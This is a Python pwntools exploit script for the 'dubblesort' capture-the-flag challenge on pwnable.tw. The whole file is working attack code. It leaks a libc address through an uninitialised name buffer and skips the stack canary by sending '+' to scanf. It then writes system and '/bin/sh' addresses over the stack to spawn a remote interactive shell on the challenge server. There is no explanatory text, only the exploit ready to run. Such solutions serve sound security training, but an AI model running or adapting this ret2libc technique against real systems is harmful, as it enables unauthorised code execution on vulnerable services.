from pwn import *

O2L_LIBC_BASE_OFFSET = 0x1b0000 #0x1d7e24
SYSTEM_OFFSET = 0x0003a940 #0x00042410
BINSH_OFFSET = 0x158e8b #0x181f68

buf = ""
buf += "A"*25

#p = process("./dubblesort")
p = remote("chall.pwnable.tw", 10101)
#p = remote("127.0.0.1",10101)

p.recvuntil("name :")
p.send(buf)
p.recvuntil("Hello "+("A"*25))
O2L = u32("\x00" + p.recv(3))
LIBC_BASE = O2L - O2L_LIBC_BASE_OFFSET
LIBC_SYSTEM = LIBC_BASE + SYSTEM_OFFSET
LIBC_BINSH = LIBC_BASE + BINSH_OFFSET

print("[+] Offset2Lib Leak: "+hex(O2L))
print("[+] Libc Base: "+hex(LIBC_BASE))
print("[+] Libc System: "+hex(LIBC_SYSTEM))
print("[+] Libc /bin/sh: "+hex(LIBC_BINSH))

p.recvuntil("sort :")
p.sendline("35")

# 0 - 24 (25)
for i in range(24):
    p.recvuntil("number : ")
    p.sendline("1")

# 25 (1)
p.recvuntil("number : ")
p.sendline("+")

# 26 - 33 (6)
for i in range(8):
    p.recvuntil("number : ")
    p.sendline(str(LIBC_SYSTEM))

# 34 - 36 (2)
for i in range(2):
    p.recvuntil("number : ")
    p.sendline(str(LIBC_BINSH))

print("[+] Waiting for shell!")
import time;time.sleep(2)
p.recv(1024)
p.interactive()
p.close()
